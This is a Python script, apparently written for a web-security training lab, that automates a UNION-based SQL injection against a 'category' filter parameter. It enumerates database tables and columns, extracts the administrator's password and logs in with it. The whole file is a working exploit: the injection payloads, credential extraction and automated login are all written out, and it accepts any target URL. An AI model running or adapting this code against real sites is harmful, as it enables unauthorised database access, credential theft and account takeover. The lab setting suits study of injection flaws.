# Lab: SQL injection attack, listing the database contents on non-Oracle databases
# PRACTITIONER

# This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
# The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
# To solve the lab, log in as the administrator user.

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxyjp = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

nombre_parametro = "Pets"

def Obtener_motor_o_version_bd(url):
    ruta = f"filter?category={nombre_parametro}"
    payload_motor_bd = "' UNION SELECT version(), NULL--"
    solicitud_motor_bd = requests.get(url + ruta + payload_motor_bd, verify=False, proxies=proxyjp)
    respuesta_motor_bd = solicitud_motor_bd.text
    if "PostgreSQL" in respuesta_motor_bd:
        print("[+] Se encontro el motor y versión de la bd")
        parseado_motor_bd = BeautifulSoup(respuesta_motor_bd, 'html.parser')
        motor_bd = parseado_motor_bd.find(string=re.compile('.*0ubuntu0.*'))
        print("[+] El motor de bd es: " + motor_bd)
        return True
    return False

def Obtener_tablas_information_schema(url):
    ruta = f"filter?category={nombre_parametro}"
    payload_obtener_tablas = "' UNION SELECT table_name,NULL FROM information_schema.tables--"
    solicitud_obtener_tablas = requests.get(url + ruta + payload_obtener_tablas, verify=False, proxies=proxyjp) 
    respuesta_obtener_tablas = solicitud_obtener_tablas.text
    if "users_" in respuesta_obtener_tablas:
        print("[+] Se obtuvo la tabla que contiene credenciales")
        parseado_obtener_tablas = BeautifulSoup(respuesta_obtener_tablas, 'html.parser')
        tabla_objetivo = parseado_obtener_tablas.find(string=re.compile('.*users_.*'))
        print("[+] La tabla objetivo que contiene credenciales es: " + tabla_objetivo)
        return True
    return False

def Obtener_tablas_information_schema_función(url):
    ruta = f"filter?category={nombre_parametro}"
    payload_obtener_tablas = "' UNION SELECT table_name,NULL FROM information_schema.tables--"
    solicitud_obtener_tablas = requests.get(url + ruta + payload_obtener_tablas, verify=False, proxies=proxyjp) 
    respuesta_obtener_tablas = solicitud_obtener_tablas.text
    if "users_" in respuesta_obtener_tablas:
        parseado_obtener_tablas = BeautifulSoup(respuesta_obtener_tablas, 'html.parser')
        tabla_objetivo = parseado_obtener_tablas.find(string=re.compile('.*users_.*'))
        return tabla_objetivo
    return None

def Obtener_columnas_information_schema(url):
    ruta = f"filter?category={nombre_parametro}"
    tabla_ya_obtenida = Obtener_tablas_information_schema_función(url)
    payload_obtener_columnas = f"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = '{tabla_ya_obtenida}'--"
    solicitud_obtener_columnas = requests.get(url + ruta + payload_obtener_columnas, verify=False, proxies=proxyjp)
    respuesta_obtener_columnas = solicitud_obtener_columnas.text
    parseado_obtener_columnas = BeautifulSoup(respuesta_obtener_columnas, 'html.parser')
    posibles_columnas = parseado_obtener_columnas.find_all('th')
    if posibles_columnas:
        for th in posibles_columnas:
            print(th.get_text().strip())
        return True
    return False

def Obtener_columnas_usuario_information_schema_función(url):
    ruta = f"filter?category={nombre_parametro}"
    tabla_ya_obtenida = Obtener_tablas_information_schema_función(url)
    payload_obtener_columnas = f"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = '{tabla_ya_obtenida}'--"
    solicitud_obtener_columnas = requests.get(url + ruta + payload_obtener_columnas, verify=False, proxies=proxyjp)
    respuesta_obtener_columnas = solicitud_obtener_columnas.text
    if "username" in respuesta_obtener_columnas:
        parseado_obtener_columnas = BeautifulSoup(respuesta_obtener_columnas, 'html.parser')
        columna_usuario = parseado_obtener_columnas.find(string=re.compile('.*username_.*'))
        return columna_usuario
    return None

def Obtener_columnas_password_information_schema_función(url):
    ruta = f"filter?category={nombre_parametro}"
    tabla_ya_obtenida = Obtener_tablas_information_schema_función(url)
    payload_obtener_columnas = f"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = '{tabla_ya_obtenida}'--"
    solicitud_obtener_columnas = requests.get(url + ruta + payload_obtener_columnas, verify=False, proxies=proxyjp)
    respuesta_obtener_columnas = solicitud_obtener_columnas.text
    if "password_" in respuesta_obtener_columnas:
        parseado_obtener_columnas = BeautifulSoup(respuesta_obtener_columnas, 'html.parser')
        columna_password = parseado_obtener_columnas.find(string=re.compile('.*password_.*'))
        return columna_password
    return None

def Obtener_credenciales_del_information_schema(url):
    ruta = f"filter?category={nombre_parametro}"
    usuario_obtenido = Obtener_columnas_usuario_information_schema_función(url)
    print("usuario_obtenido: ", usuario_obtenido)
    password_obtenido = Obtener_columnas_password_information_schema_función(url)
    print("password_obtenido: ", password_obtenido)
    tabla_ya_obtenida = Obtener_tablas_information_schema_función(url)
    print("tabla_ya_obtenida: ", tabla_ya_obtenida)
    payload_credenciales = f"' UNION SELECT {usuario_obtenido}, {password_obtenido} FROM {tabla_ya_obtenida}--"
    solicitud_obtener_credenciales = requests.get(url + ruta + payload_credenciales, verify=False, proxies=proxyjp) 
    respuesta_obtener_credenciales = solicitud_obtener_credenciales.text
    parseado_obtener_credenciales = BeautifulSoup(respuesta_obtener_credenciales, 'html.parser')
    posibles_fila = parseado_obtener_credenciales.find_all('tr')
    #posibles_contraseñas = parseado_obtener_credenciales.find_all('td')
    for fila in posibles_fila:
        posible_usuario = fila.find('th')
        if posible_usuario and posible_usuario.get_text().strip() == "administrator":
            posible_contraseña = fila.find('td')
            if posible_contraseña and posible_contraseña.get_text().strip():
                print("[+] Usuario: ", posible_usuario.get_text().strip())
                print("[+] Contraseña: ", posible_contraseña.get_text().strip())
                return True
    return False

def Obtener_credenciales_del_information_schema_función(url):
    ruta = f"filter?category={nombre_parametro}"
    usuario_obtenido = Obtener_columnas_usuario_information_schema_función(url)
    password_obtenido = Obtener_columnas_password_information_schema_función(url)
    tabla_ya_obtenida = Obtener_tablas_information_schema_función(url)
    payload_credenciales = f"' UNION SELECT {usuario_obtenido}, {password_obtenido} FROM {tabla_ya_obtenida}--"
    solicitud_obtener_credenciales = requests.get(url + ruta + payload_credenciales, verify=False, proxies=proxyjp) 
    respuesta_obtener_credenciales = solicitud_obtener_credenciales.text
    parseado_obtener_credenciales = BeautifulSoup(respuesta_obtener_credenciales, 'html.parser')
    posibles_fila = parseado_obtener_credenciales.find_all('tr')
    #posibles_contraseñas = parseado_obtener_credenciales.find_all('td')
    for fila in posibles_fila:
        posible_usuario = fila.find('th')
        if posible_usuario and posible_usuario.get_text().strip() == "administrator":
            posible_contraseña = fila.find('td')
            if posible_contraseña and posible_contraseña.get_text().strip():
                #print("[+] Usuario: ", posible_usuario.get_text().strip())
                #print("[+] Contraseña: ", posible_contraseña.get_text().strip())
                return posible_contraseña.get_text().strip()
    return None

def get_csrf_token(s, url):
    r = s.get(url + "login", verify=False, proxies=proxyjp)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def inicio_de_sesión(s, url):
    Contraseña = Obtener_credenciales_del_information_schema_función(url)
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf,
            "username": "administrator",
            "password": Contraseña}
    r = s.post(url + "login", data=data, verify=False, proxies=proxyjp)
    res = r.text
    if "Log out" in res: #el texto "Log out" aparece solo si se ha iniciado sessión con exito
        return True
    else:
        return False

#def probando_columnas(url):
 #   usuario_obtenido = Obtener_columnas_usuario_information_schema_función(url)
 #  print(usuario_obtenido)
 #   password_obtenido = Obtener_columnas_password_information_schema_función(url)
 #   print(password_obtenido)
 #   Contraseña = Obtener_credenciales_del_information_schema_función(url)
 #   print(Contraseña)


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Uso: %s <url>" % sys.argv[0])
        print("[-] Ejemplo: %s <https://paganaxyz.com>" % sys.argv[0])
        sys.exit(-1)
    #print("[+] Obteniendo motor de base de datos") #credenciales del usuario administrator
    #if not Obtener_motor_o_version_bd(url):
     #   print("[-] No se puedo obtener el motor de bd") 
    #print("[+] Obteniendo tabla objetivo")
    #if not Obtener_tablas_information_schema(url):
     #   print("[-] No se puedo obtener la tabla objetivo") 
    #if not Obtener_columnas_information_schema(url):
     #   print("[-] No se puedo obtener las columnas ") 
    #if not probando_columnas(url):
     #   print("[-] No se puede obtener columna usuario")
  #  if not Obtener_credenciales_del_information_schema(url):
   #     print("[-] No se puede obtener credenciales")
    s = requests.Session()
    if inicio_de_sesión(s, url):
        print('[+] SQLi Bypass Inicio de sessión exitoso')
    else:
        print('[+] SQLi Bypass Inicio de sessión fallido')